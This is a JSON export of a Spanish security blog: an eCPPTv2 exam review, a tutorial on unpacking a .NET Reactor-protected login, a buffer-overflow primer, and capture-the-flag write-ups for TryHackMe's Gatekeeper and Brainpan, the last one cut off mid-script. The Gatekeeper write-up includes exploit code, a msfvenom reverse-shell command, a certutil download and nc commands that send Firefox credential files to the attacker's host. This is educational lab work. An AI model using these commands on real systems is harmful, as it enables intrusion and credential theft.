[{"content":"","date":null,"permalink":"/","section":"Be4St","summary":"","title":"Be4St"},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"¡Hola a todos!, hace una semana hice el examen de eLearnSecurity y vengo a contaros mi experiencia en cuanto a dificultad y contenidos.\n¿Vale la pena? # Desde mi perspectiva, definitivamente considero que vale la pena realizar este examen. El laboratorio ofrece una experiencia bastante cercana a un entorno real, lo que proporciona una idea más concreta de situaciones que podrían presentarse en la práctica.\nDespués de comprometer todos los sistemas requeridos en el laboratorio, se debe llevar a cabo la elaboración de un informe. En mi caso, siendo esta la primera vez, encontré que este proceso fue altamente beneficioso para mejorar mis habilidades en la redacción de informes detallados.\nEn conjunto, la combinación de un laboratorio realista y la posterior tarea de generar un informe brindan un aprendizaje integral y valioso.\n¿Cómo definirías su dificultad? # En relación a este examen, no lo consideraría excesivamente desafiante, pero tampoco podría catalogarlo como sencillo. El contenido del laboratorio es bastante detallado. Siguiendo una dinámica similar a la que experimenté en el eJPT, recalcaría que el aspecto más crucial radica en enumerar metódicamente y presentar de manera ordenada todos los hallazgos obtenidos, ya sea a través de texto explicativo o mediante capturas de pantalla ilustrativas.\nEl período destinado al laboratorio abarca un total de 7 días, mientras que se concede otro lapso igual de tiempo para la elaboración del informe. Por lo tanto, existe la posibilidad de abordar el proceso de manera tranquila y progresiva.\nEn mi caso personal, empleé tres días para completar el laboratorio en sí y otros tres días adicionales para confeccionar el reporte. Durante todo el proceso, tuve acceso mediante una conexión VPN, lo que pude usar todas las herramientas de nuestro entorno.\n¿Qué repasar para ese momento? # Los temas que puedes abarcar son los siguientes:\nPivoting (Chisel, netsh, socat, etc.) Fuzzing Hacking Web Burpsuite Metasploit (Tu mejor amigo) Persistencia en Windows Escalada de privilegios Eumeración Post-Explotación en Linux y Windows Buffer overflow ¿Cómo es el examen? # Antes que nada, quiero mencionar que es importante ingresar las credenciales de la VPN antes de iniciar el examen en la sección \u0026ldquo;VPN Credentials\u0026rdquo;.\nAdemás, quiero destacar un detalle importante: actualmente, la VPN presenta un problema de cifrado que también ha sido reportado en diversas plataformas. Una vez que este problema se resuelva, se podrá comenzar con el laboratorio sin ningún inconveniente. Estoy seguro de que esto facilitará el proceso.\nEn cuanto al examen, se otorgan un total de 14 días, lo que proporciona tiempo más que suficiente. En mi caso, completé el laboratorio en tan solo tres días. Dado que tenía tiempo adicional, decidí crear un \u0026ldquo;write-up\u0026rdquo; muy detallado. Esto resultó fundamental para mí, ya que al tener una explicación exhaustiva junto con las imágenes, evitaba confusiones al redactar el informe posterior. Fue una estrategia que me resultó muy beneficiosa.\n¿Cómo se hace un reporte? # Hablando de los informes, al principio no tenía experiencia en eso, pero con la plantilla de TCM Security, todo se hizo más fácil. Mi informe final terminó llegando a unas 55 páginas. Hacer menos páginas no significa que esté mal siempre que tenga todos los contenidos que se piden para poder hacer el reporte.\nSiguiendo la plantilla no deberías tener ningún problema a la hora de empezar con la elaboración del informe.\nAlgunos de los datos que debería contener:\nLenguaje formal\nInforme ejecutivo y técnico\nÍndice informativo\nClasificación de vulnerabilidades\nCriticidad de las vulnerabilidades\nPruebas de concepto\nRemediación\nTabla informativa al final del informe (se solicita en \u0026ldquo;letter of engagement\u0026rdquo; en el examen).\nPlantilla: TCM Security Template\nTips # Hacer capturas y apuntar todo lo que obtengas para evitar hacer el proceso numerosas veces. Probar siempre varias maneras de hacer las cosas. Utilizar varias herramientas, no centrarse solo en una. En mi caso tuve que cambiar de entorno porque me daba problemas,por lo tanto recomiendo usar un kali linux / parrot recién instalado. Máquinas que pueden ser útiles para practicar: # Relevant (THM) Brainpan (THM) Gatekeeper (THM) Wreath (THM) Está sala no la hice debido a que tenia un nivel apto de pivoting, pero si no se tiene el conocimiento, sin duda te vendrá genial. Sala preparatoria de TryHackMe de Buffer overflow (OSCP) Crearse un entorno con varias máquinas para practicar pivoting (Abusar de todas las vulnerablidades y vías para obtener conexión con la última máquina). Kali Linux Debian Windows Metasploitable ","date":"6 September 2023","permalink":"/posts/ecpptv2-review/","section":"Posts","summary":"Recientemente me he sacado la certificación eCPPTv2, ¿qué tan difícil es?, ¿merece la pena pagar por esta certificación?","title":"eCPPTv2 Review"},{"content":"","date":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"/categories/resources/","section":"Categories","summary":"","title":"Resources"},{"content":"","date":null,"permalink":"/categories/reversing/","section":"Categories","summary":"","title":"Reversing"},{"content":"Herramientas que se usarán en este post # ExeInfo PE PEviwer OllyDbg HxD de4dot DnSpy Información sobre el ejecutable # Comenzaremos viendo que tipo de empaquetado contiene el ejecutable, para ello usaremos una utilidad que nos permite ver lo mecionado anteriormente, lo arrastramos hacia el \u0026ldquo;Exeinfo PE\u0026rdquo;.\nComo podemos ver es \u0026ldquo;.Net Reactor 4.x -6.x\u0026rdquo; y que está ofuscado con el método nativo, este tipo de ofuscación lo que hace realmente es empaquetar el ejectuable real con \u0026ldquo;__\u0026rdquo;. Para poder ver que contiene ese RCDATA (Son datos sin procesar), vamos usar de nuevo una herramienta llamada \u0026ldquo;PEviewer\u0026rdquo; para explorar el ejecutable y comprobar si existe ese dato. De nuevo arrastramos el ejecutable a la aplicación y accedemos al apartado de \u0026ldquo;Recursos\u0026rdquo;.\nUna vez que hemos accedido podemos ver que contiene ese valor.\nHemos comprobado que existe ese dato sin procesar, abriremos nuestro debugger favorito para tratar de dumpear la ofuscación y obtener la dirección del programa real, en mi caso usaré OllyDBG.\nDebugging # Ahora que tenemos abierto el debugger, tenemos que hacer click derecho sobre un espacio en blanco y buscar todas las cadenas de texto referenciadas.\nDebemos fijarnos de nuevo en \u0026ldquo;__\u0026rdquo; , pinchamos sobre la referencias y hacemos un seguimiento.\nTan solo deberíamos bajar un poco y nos encontraremos con \u0026lsquo;SafeArrayCreate\u0026rsquo; y \u0026lsquo;SafeArrayAccessData\u0026rsquo;.\n¿Qué significa esto? # Lo que nos permite es llamar al \u0026lsquo;SafeArrayLock\u0026rsquo; para poder acceder a los datos del array seguro, que es donde está el ejecutable real.\nComo lo tenemos localizados , y viendo lo que hace el ejecutable , vemos que hay una llamada al ejecutable un poco más abajo del segundo \u0026ldquo;SafeArrayAccesData\u0026rdquo;, en concreto esta:\nPonemos un breakpoint en la llamada, con pulsar F2 sería suficiente.\nPulsamos en el botón para inciar el ejecutable.\nUna vez que le hemos dado nos aparece el mensaje \u0026ldquo;Access violation when writing to [xxxxxx]\u0026rdquo;\n¿Por qué ocurre esto? # Suele producirse cuando se encuentra un fallo, debido a un error de programación que hizo que la CPU ejecutara las instrucciones incorrectas o utilizara los datos equivocados. Para poder evitarlo, debemos añadir unas excepciones en la configuración de OllyDBG. Presionando alt + o , vamos al panel de opciones, pincharemos en la pestaña excepciones y marcaremos todas las opciones que nos aparecen.\nHabiendo hecho este proceso, podemos continuar, por lo tanto volvemos a inicar el programa, pero en esto caso despues de inciarlo, tenemos que dar de nuevo al botón para que nos lleve al breakpoint que hemos puesto anteriormente.\nDebemos pasar a una llamada por encima del breakpoint, con el cuarto botón comenzando desde el de iniciar.\nTenemos que seguir los Dumps de la dirección de memoria llamada \u0026ldquo;EAX\u0026rdquo;, en donde se encontraremos el ejecutable descifrado del recurso \u0026ldquo;__\u0026rdquo;.\nVemos la palabra \u0026ldquo;MZ\u0026rdquo;.\n¿Qué es MZ? # El encabezado MZ se encuentra al principio de los archivos ejecutables y es una parte ensencial que permite que el S.O comprenda como cargar y ejecutar el prgrama en memoria, lo que provoca en este caso esque todo lo que esté por encima de \u0026ldquo;MZ\u0026rdquo; nos impida ver el código en claro. Por lo tanto, vamos a realizar un Backup de la dirección de memoria \u0026ldquo;EAX\u0026rdquo;. Hacemos click derecho sobre el código ASCII, Backup\u0026gt;Save data to file.\nObtención de la aplicación real # Tenemos la dirección de memoria, la podemos abrir con \u0026ldquo;HxD\u0026rdquo; para poder eliminar todo lo que hay por encima de \u0026ldquo;MZ\u0026rdquo;. La barra superior tiene varias opciones , en este caso usaremos \u0026ldquo;Buscar\u0026rdquo; para encontrar el texto \u0026ldquo;MZ\u0026rdquo;.\nCon la utilidad \u0026ldquo;Edición\u0026rdquo; podemos marcar una una porción del bloque que nosotros queramos, funciona con posiciones, es decir desde la 0 hasta 77207 que es la que está justo antes de \u0026ldquo;MZ\u0026rdquo;.\nBorramos todo lo seleccionado y lo guardamos. Abrimos DnSpy para guardarnos \u0026ldquo;__\u0026rdquo; el ejecutable real que se encuentra en \u0026ldquo;Recursos\u0026rdquo;.\nUna vez guardado le cambiamos la extensión a \u0026ldquo;.exe\u0026rdquo; y lo arrastramos de nuevo a DnSpy, pero como podemos ver aún sigue ofuscado.\nLimpieza de Código # Quedaría usar de4dot para poder eliminar por completo todo el empaquetado.\nDe nuevo, lo arrastramos a DnSpy y vemos que está el texto completamente en claro.\n","date":"18 August 2023","permalink":"/posts/unpack-net-reactor/","section":"Posts","summary":"¡Hola a todos!, Os traigo un post en donde se realizará ingeniería inversa a un pequeño login que he creado en C ofuscado con .Net reactor.","title":"Unpack .Net Reactor (Native)"},{"content":"","date":null,"permalink":"/categories/tryhackme/","section":"Categories","summary":"","title":"TryHackMe"},{"content":"Comprobamos que la máquina esté activa.\nping -c1 10.10.20.222 PING 10.10.20.222 (10.10.20.222) 56(84) bytes of data. 64 bytes from 10.10.20.222: icmp_seq=1 ttl=127 time=45.4 ms --- 10.10.20.222 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 45.424/45.424/45.424/0.000 ms Relizamos un escaneo de nmap para ver lor servicios y puertos expuestos de la máquina, en este caso debemos fijarnos en el puerto 445.\nsudo nmap -sS --min-rate 5000 -n -v -p- 10.10.20.222 [sudo] contraseña para shadoow: Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 12:10 CEST Initiating Ping Scan at 12:10 Scanning 10.10.20.222 [4 ports] Completed Ping Scan at 12:10, 0.07s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:10 Scanning 10.10.20.222 [65535 ports] Discovered open port 445/tcp on 10.10.20.222 Discovered open port 135/tcp on 10.10.20.222 Discovered open port 3389/tcp on 10.10.20.222 Discovered open port 139/tcp on 10.10.20.222 Discovered open port 49153/tcp on 10.10.20.222 Discovered open port 49154/tcp on 10.10.20.222 Discovered open port 49161/tcp on 10.10.20.222 Discovered open port 49167/tcp on 10.10.20.222 Discovered open port 31337/tcp on 10.10.20.222 Discovered open port 49155/tcp on 10.10.20.222 Discovered open port 49152/tcp on 10.10.20.222 Completed SYN Stealth Scan at 12:10, 13.95s elapsed (65535 total ports) Nmap scan report for 10.10.20.222 Host is up (0.043s latency). Not shown: 65524 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 31337/tcp open Elite 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49161/tcp open unknown 49167/tcp open unknown Con SMBMap podemos descargarnos un ejecutable.\nsmbmap -H 10.10.20.222 -u guest -r Users/Share [+] IP: 10.10.20.222:445 Name: 10.10.20.222 Disk Permissions Comment ---- ----------- ------- Users READ ONLY .\\UsersShare\\* dr--r--r-- 0 Fri May 15 03:58:07 2020 . dr--r--r-- 0 Fri May 15 03:58:07 2020 .. fr--r--r-- 13312 Fri May 15 03:58:07 2020 gatekeeper.exe ~ ❯ smbmap -H 10.10.20.222 -u guest --download Users/Share/gatekeeper.exe [+] Starting download: Users\\Share\\gatekeeper.exe (13312 bytes) [+] File output to: /home/shadoow/10.10.20.222-Users_Share_gatekeeper.exe Buffer Overflow # Testeamos con python para comprobar si se produce un desbordamiento.\nprint \u0026#34;A\u0026#34; * 300 Creamos un patrón cíclico con msfpattern y lo aplicamos a la variable “payload”.\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 Con mona encontramos el offset exacto del EIP(Ultima instrucción a ejecutar).\nModificando el exploit, en la variable offset = 146 y en la variable retn = BBBB , podemos ver que tenemos el control def flujo sobre esa instrucción.\nimport socket ip = \u0026#34;10.0.3.5\u0026#34; port = 31337 offset = 146 overflow = \u0026#34;A\u0026#34; * offset retn = \u0026#34;BBBB\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;\u0026#34; postfix = \u0026#34;\u0026#34; Con mona generamos un bytearray para encontrar los badchars.\nCon python los generamos y los ponemos en la variable “payload”.\nScript Badchars:\nfor x in range(1, 256): print(\u0026#34;\\\\x\u0026#34; + \u0026#34;{:02x}\u0026#34;.format(x), end=\u0026#39;\u0026#39;) print() Encontramos los bad chars, en este caso son \\x00 y \\x0a.\nBuscamos los puntos de salto para ello podemos usar la siguiente sintaxis con mona.\n!mona jmp -r esp -cpb \u0026#34;\\x00\\xa0\u0026#34; 0x080414c3 -\u0026gt; \\xc3\\x14\\x04\\x08 Generamos una reverse shell con msfvenom, y lo agregamos a la variable \u0026ldquo;payload\u0026rdquo;.\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.11.37.230 LPORT=1234 -b \u0026#34;\\x00\\x0a\u0026#34; -f python EXITFUNC=thread -v payload nc -lvnp 1234 Escalada de privilegios # Explorando la máquina y haciendo un poco de investigación vemos que \u0026ldquo;ljfn812a.default-release\u0026rdquo; es un directorio que puede guardar credenciales guardadas en el navegador.\nC:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release Para poder transferirnos los archivos nos podemos descargar nc.exe y nos lo pasamos a la máquina Windows con certutil.\nhttps://eternallybored.org/misc/netcat/ certutil -f -urlcache http://\u0026lt;IP:Port\u0026gt;/recurso.exe \u0026lt;recurso_nombre.exe\u0026gt; En windows:\nnc.exe -nv 10.11.37.230 12345 \u0026lt; key4.db nc.exe -nv 10.11.37.230 12345 \u0026lt; logins.json En nuestro kali:\nnc -lvnp 12345 \u0026gt; key4.db nc -lvnp 12345 \u0026gt; logins.json Nos descargamos firepwd.py, es una herramienta que nos permite extraer las credenciales guardadas de un navegador con los archivos transferidos anteriormente.\nNos pasamos los archivos descargados anteriormente a la carpeta “firepwd”\nhttps://github.com/lclevy/firepwd instalamos lo requirements pip install -r requirements.txt python3 firepwd.py Lo ejecutamos:\nAccedemos por RDP y obtenemos la flag.\nxfreerdp /u:mayor /p:\u0026#39;***************\u0026#39; /cert:ignore /v:10.10.20.222 ","date":"12 July 2023","permalink":"/posts/gatekeeper-thm/","section":"Posts","summary":"Resolución de la Máquina Gatekeeper de TryHackMe de dificultad media abordando contenido de Buffer overflow.","title":"Write Up Gatekeeper"},{"content":"Introducción # El desbordamiento de memoria de búfer se remontan a la década de 1970, sin embargo hasta finales de los 80 no se produjo el primer ataque de este tipo, el servicio \u0026ldquo;finger\u0026rdquo; de UNIX fue el explotado mediante el desbordamiento de pila.\nLos desbordamientos de búfer se siguen produciendo en aplicaciones de software, y su explotación puede depender de muchos factores, ya sea de las opciones de los compiladores o la seguridad del sistema operativo.\n¿Qué es un Buffer? # Un buffer es un espacio temporal de memoria fisica que se usa para almacenar información mientras está se envia de un lado a otro. Es una respuesta rápida que se utiliza para optimizar un proceso de transferencia de datos, estos suelen estar en la memoria RAM. Los búferes estan diseñados para poder contener una cantidad específica de datos, si el programa no tiene una instrucción incoporada, lo datos se sobrescribiran en los datos de la memoria adyacente al búfer.\n¿Qué es un registro? # La definición más simple de un registro es entenderlo como si fuera variable. Es un región de memoria en la que podemos almacenar y leer datos. La diferencia con las variables que nosotros definimos es que lo registros sirven de un próposito concreto y son limitados. Un registro puede variar según la arquitectura de CPU pueden ser de 32 bits o 64 bits.\nRegistros de CPU # Según la arquitectura hay nomenclaturas diferentes para cada registro:\nRegistros de 64 bits: RAX, RBC, RCX, RDX, RSI, RDI, RBP, RSP Registros de 16 bits: AX, BX, CX, DX, SI, DI, BP, SP, IP Registros de 8bits: AH, AL, BH, BL, CH, CL, DH, DL En este caso nos centraremos en los registros de 32 bits.\nNomenclatura Nombre Completo Uso EIP Extended Instruction Pointer Es la siguiente dirección de memoria que se debería ejecutar. EAX Extended Accumulator Register Almacena de forma temporal cualquier dirección de retorno. ESI Extended Source Index Contiene la dirección de memoria de los datos de entrada. EBX Extended Base Register Almacena datos y direcciones de memoria. ESP Extended Stack Pointer Se usa para referenciar el inicio de un hilo. EBP Extended Base Pointer Indica la dirección de memoria del final de un hilo. Little Indian y Big Indian # Son dos estilos diferentes de almacenar los datos en memoria.\nEn little Indian, el byte significativo más pequeño se almacena en la dirección más baja o la primera, mientras que el byte significativo más grande se almacena en la dirección más alta. Basícamente el byte más pequeño se almacena el primero y el byte más alto se almacena el último.\nEn Big Indian,el byte más significativo se almacena en la dirección más baja (o primera), y el byte menos significativo se almancena en la dirección más alta.\n¿Qué es un Buffer Overflow? # Un Buffer overflow también conocido como desborde de memoria, se produce cuando un programa excede el uso de cantidad de memoria asignada, lo cual provoca que los datos de entrada ocupen zonas de memoria adyacentes, donde se podria ejecutar código.\nLa explotación de esta vulnerabilidad se centra en sobrescribir la dirección de retorno (EIP). De esta forma se puede redirigir el flujo de ejecucción del programa haciendo que pueda ir a un código desarrollado por el atacante, también se podría producir un ataque de denegación de servicio.\nTipos de Buffer Overflow # Stack overflow: El desbordamiento de pila es un tipo de error que se produce cuando un programa informático intenta usar más espacio de memoria en la pila del que está asignado.La pila de llamadas , denominada \u0026ldquo;segmento de pila\u0026rdquo; es un búfer de tamaño fijo que almacena variables y funciones locales y datos de dedirección de retorno durante la ejecucción. La pila de llamadas se adhiere a un tipo de arquitectura de último en entrar, primero en salir (LIFO). Cada función tiene su marco de pila, esto se añade a la parte superior de la pila de llamadas.Este marco de pila permanece en la memoria hasta que la función termine de ejecutarse, liberando así memoria para otros marcos de pila. El tamaño de una pila se suele definir a la hora del inicio del programa, su tamaño depende de determinados facotres , como la arquitectura del ordenador , el lenguaje de programación, cantidad de memoria utilizada. Si un programa demanda más memoria de la que hay disponible se produce un desbordamiento de pila, lo que puede provocar que el programa se bloqueé.\nHeap overflow: A diferencia de la pila de llamadas, existe lo que se denomina como segmento, es un espacio de memoria que se asigna dinámicamente y que se almacena en variables globales. Este segmento también es igual de vulnerable que el de la \u0026ldquo;pila de llamadas(Stack)\u0026quot;.Con los heaps, los que desarrollan los programas son responsables de reasignar la memoria, si no lo hacen de la forma correcta puede producirse un desbordamiento de pila. Este desbordamiento también puede ocurrir cuando las variables almacenadas contienen más datos que la cantidad de memoria asignada.\nDiferencias entre Stack y Heap # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void foo(int valor) { unsigned char c; unsigned char *ptr = malloc(1); printf(\u0026#34;Stack: %p | Heap: %p\\n\u0026#34;, \u0026amp;c, ptr); if(valor \u0026lt;= 0) return; foo(valor - 1); } int main(){ foo(10); return 0; } La diferencia se ve en que el Stack Overflow el valor va disminuyendo, sin embargo en el Heap Overflow va aumentando.\nPrevención # Aleatorización del espacio de direcciones: Reorganiza de forma aleatoria las ubicaciones del espacio de direcciones de las áreas de datos clave de un proceso, los ataques de Buffer Overflow se suelen centrar en una ubicación exacta del código en cuestión, esta aleatoriedad lo hace casi imposible.\nPrevención de la ejecucción de datos: Se pueden marcar áreas de memoria como ejecutables o los que no son ejecutables, lo que también impide esta vulnerabilidad.\n","date":"1 June 2023","permalink":"/posts/bof-introduction/","section":"Posts","summary":"Conceptos fundamentales para Buffer overflow.","title":"Introducción a Buffer overflow"},{"content":"Enumeración # Comenzamos mirando que la máquina esté activa.\nping -c1 10.10.173.74 PING 10.10.173.74 (10.10.173.74) 56(84) bytes of data. 64 bytes from 10.10.173.74: icmp_seq=1 ttl=63 time=47.3 ms --- 10.10.173.74 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 47.279/47.279/47.279/0.000 ms Realizamos un reconocimiento de puertos.\nsudo nmap -sS --min-rate 5000 -p- -n -vvv 10.10.173.74 [sudo] contraseña para shadoow: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:35 CEST Initiating Ping Scan at 14:35 Scanning 10.10.173.74 [4 ports] Completed Ping Scan at 14:35, 0.09s elapsed (1 total hosts) Initiating SYN Stealth Scan at 14:35 Scanning 10.10.173.74 [65535 ports] Discovered open port 10000/tcp on 10.10.173.74 Discovered open port 9999/tcp on 10.10.173.74 Completed SYN Stealth Scan at 14:36, 12.98s elapsed (65535 total ports) Nmap scan report for 10.10.173.74 Host is up, received echo-reply ttl 63 (0.047s latency). Scanned at 2023-05-27 14:35:54 CEST for 12s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 9999/tcp open abyss syn-ack ttl 63 10000/tcp open snet-sensor-mgmt syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds Raw packets sent: 65648 (2.888MB) | Rcvd: 65591 (2.624MB) Con un escaneo mas exahustivo obtenemos mayor información.\nnmap -sCV -p9999,10000 10.10.173.74 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:37 CEST Nmap scan report for 10.10.173.74 Host is up (0.045s latency). PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.93%I=7%D=5/27%Time=6471F981%P=x86_64-pc-linux-gnu%r(NU SF:LL,298,\u0026#34;_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\| SF:\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\ SF:x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x SF:20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x SF:20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x SF:20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\| SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x SF:20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x SF:20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x SF:20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_ SF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x SF:20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x SF:20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x SF:20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026gt;\u0026gt;\\x20\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds Nos fijamos en el puerto 10000 y hacemos fuzzing para encontrar rutas, en este caso hemos encontrado “/bin” , contiene un .exe por lo tanto nos le descargamos.\ngobuster dir -u http://10.10.173.74:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,exe,py =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.173.74:10000 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt,exe,py [+] Timeout: 10s =============================================================== 2023/05/27 14:41:31 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 215] /bin (Status: 301) [Size: 0] [--\u0026gt; /bin/] Progress: 8852 / 1323366 (0.67%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2023/05/27 14:42:56 Finished =============================================================== Buffer overflow # Fuzzeamos para ver la cantidad de bytes que admite.\nCreamos un patrón con msf del tamaño de 600 bytes.\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600 Lo aplicamos al script en la variable \u0026ldquo;payload\u0026rdquo;.\n#!/usr/bin/python import socket ip = \u0026#34;10.0.3.9\u0026#34; port = 9999 prefix = \u0026#34;brain \u0026#34; offset = 0 overflow = \u0026#34;A\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\u0026#34; payload = 